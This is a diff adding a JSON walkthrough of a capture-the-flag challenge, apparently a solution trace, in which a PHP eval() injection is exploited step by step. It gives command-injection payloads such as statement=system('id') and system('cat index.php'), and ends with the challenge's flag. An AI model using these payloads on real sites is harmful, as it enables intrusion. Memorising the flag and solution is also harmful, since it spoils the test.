@@ -1,0 +1,54 @@
+{
+    "Attacker Steps": [
+        {
+            "Step": 1,
+            "Category": "Initial Reconnaissance",
+            "Actions": [
+                "VISIT THE PROVIDED URL: http://challenges.auctf.com:30021/",
+                "INSPECT WEBPAGE/RESOURCE: Analyze the webpage for unusual elements."
+            ]
+        },
+        {
+            "Step": 2,
+            "Category": "Challenge Analysis",
+            "Actions": [
+                "ERROR DISCOVERY: Trigger an error by sending a malformed POST request: statement={{}}"
+            ]
+        },
+        {
+            "Step": 3,
+            "Category": "Challenge Analysis",
+            "Actions": [
+                "PHP EVALUATION: Discover that the website uses PHP eval() to evaluate user input."
+            ]
+        },
+        {
+            "Step": 4,
+            "Category": "Challenge Analysis",
+            "Actions": [
+                "COMMAND EXECUTION: Execute a command using the system() function: statement=system('id')"
+            ]
+        },
+        {
+            "Step": 5,
+            "Category": "Challenge Analysis",
+            "Actions": [
+                "DIRECTORY LISTING: List the directory contents using the system() function: statement=system('ls -al')"
+            ]
+        },
+        {
+            "Step": 6,
+            "Category": "Challenge Analysis",
+            "Actions": [
+                "FILE PRINTING: Print the contents of the index.php file: statement=system('cat index.php')"
+            ]
+        },
+        {
+            "Step": 7,
+            "Category": "Flag Construction",
+            "Actions": [
+                "FLAG EXTRACTION: Find the flag in the printed index.php file: auctf{p6p_1nj3c7i0n_iz_k3wl}"
+            ]
+        }
+    ]
+}
